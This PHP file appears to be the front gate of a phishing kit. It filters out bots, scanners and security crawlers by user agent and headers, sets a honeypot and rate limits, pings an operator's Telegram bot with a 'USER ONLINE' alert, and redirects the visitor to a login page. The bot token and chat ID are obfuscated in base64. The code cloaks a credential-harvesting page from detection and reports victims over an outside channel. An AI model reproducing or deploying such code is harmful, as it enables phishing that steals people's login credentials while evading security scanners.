<?php
session_start();

// 1. First Layer - Basic Bot Filter (GET/POST)
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (!isset($_SESSION['verified'])) {
    // Block empty User-Agent and basic bots
    if (empty($userAgent) || preg_match('/bot[^a-z]|crawl|spider|archiver|jabber|scan|graber|harvest|track|pingmon|screenshot|curl|wget|python-requests|go-http-client|java|okhttp|httpclient|scrapy|phpspider|pinterest|cloudflare|semrush/i', strtolower($userAgent))) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    
    // Additional bot checks
    if (!isset($_SERVER['HTTP_ACCEPT']) || !isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    
    // Only set verified after passing all checks
    $_SESSION['verified'] = true;
}

// 2. Browser Validation Layer (GET requests only)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Device capability check
    $requiredHeaders = ['HTTP_ACCEPT','HTTP_ACCEPT_LANGUAGE','HTTP_USER_AGENT'];
    foreach($requiredHeaders as $h) {
        if(!isset($_SERVER[$h]) || empty($_SERVER[$h])) {
            header("HTTP/1.1 403 Forbidden");
            exit;
        }
    }

    // Generate time-limited token for form submission
    if (!isset($_SESSION['form_token'])) {
        $_SESSION['form_token'] = bin2hex(random_bytes(16));
        $_SESSION['form_start'] = time();
    }
}



// Add honeypot trap
$hpField = 'hp_'.substr(md5($_SESSION['form_token']), 0, 8);
if (isset($_SESSION['form_token']) && !empty($_POST[$hpField])) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}

// 5. Rate Limiting by IP
$ip = $_SERVER['REMOTE_ADDR'];
$attemptsFile = 'attempts.json';
$rateLimits = [
    'GET' => ['limit' => 30, 'window' => 300],  // Increased from 15
    'POST' => ['limit' => 10, 'window' => 600]  // Increased from 5
];

$attempts = file_exists($attemptsFile) ? json_decode(file_get_contents($attemptsFile), true) : [];
$method = $_SERVER['REQUEST_METHOD'];
$currentTime = time();

if (!isset($attempts[$ip][$method])) {
    $attempts[$ip][$method] = [
        'count' => 1,
        'first' => $currentTime,
        'last' => $currentTime
    ];
} else {
    $attempts[$ip][$method]['count']++;
    $attempts[$ip][$method]['last'] = $currentTime;
    if ($currentTime - $attempts[$ip][$method]['first'] > $rateLimits[$method]['window']) {
        unset($attempts[$ip][$method]);
    }
}

if ($attempts[$ip][$method]['count'] > $rateLimits[$method]['limit']) {
    header("HTTP/1.1 429 Too Many Requests");
    exit;
}
file_put_contents($attemptsFile, json_encode($attempts));

// Token del tuo bot
$botApiToken = base64_decode('NzUzNzQ5NzY5MTpBQUhidlY0QUNGM1NUd0tLRjRIR3lMcXFmbGtJMV83cGZ6Yw==');
// Il tuo chat ID
$channelId = base64_decode('ODAxNzA4NjcxNQ==');

// Testo del messaggio
$txt = "🤵USER ONLINE";

// Costruisci la query
$query = http_build_query([
    'chat_id' => $channelId,
    'text' => $txt,
]);

// URL per inviare il messaggio
$url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

// Inizializza cURL
$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => 'GET',
]);

// Esegui la richiesta e cattura la risposta
$response = curl_exec($curl);
curl_close($curl);

// Reset rate limiting
if (isset($attempts[$ip]['GET'])) {
    unset($attempts[$ip]['GET']);
    file_put_contents($attemptsFile, json_encode($attempts));
}

// Reindirizza all'indirizzo principale (index.php)
header('Location: login/index.html');
exit;
?>
